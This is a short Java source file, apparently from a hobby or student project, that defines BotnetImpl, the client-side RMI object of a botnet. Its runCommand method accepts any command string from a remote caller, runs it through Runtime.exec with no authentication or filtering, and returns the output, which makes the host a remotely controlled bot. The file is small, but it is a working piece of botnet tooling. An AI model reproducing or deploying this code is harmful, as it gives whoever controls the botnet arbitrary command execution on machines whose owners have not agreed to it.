/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package client;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;
import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.Logger;
import model.Botnet;
import rmi.IBotnet;

/**
 *
 * @author haiclover
 */
public class BotnetImpl extends UnicastRemoteObject implements IBotnet{

    public BotnetImpl() throws RemoteException {
    }
    
    @Override
    public Botnet getBotnet() throws RemoteException {
        Botnet b = new Botnet();
        return b;
    }
    
    public void testing() throws RemoteException {
        System.out.println("This is running on client");
    }
    
    public ArrayList<String> runCommand(String cmd) throws RemoteException {
        Process process;
        ArrayList<String> arr = new ArrayList<>();
        try {
            process = Runtime.getRuntime().exec(cmd);
//            ObjectInputStream ois = new ObjectInputStream(process.getInputStream());
//            ObjectOutputStream oos = new ObjectOutputStream(process.getOutputStream());
//            oos.writeObject(oos);
//            Object obj = ois.readObject();
//            System.out.println(obj.toString());
            
//            return ois;
            BufferedReader result = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String s = null;
            while ((s = result.readLine()) != null) {
//                System.out.println(s);
                arr.add(s);
            }
        } catch (IOException ex) {
            Logger.getLogger(BotnetImpl.class.getName()).log(Level.SEVERE, null, ex);
        }
        return arr;
    }
    
}
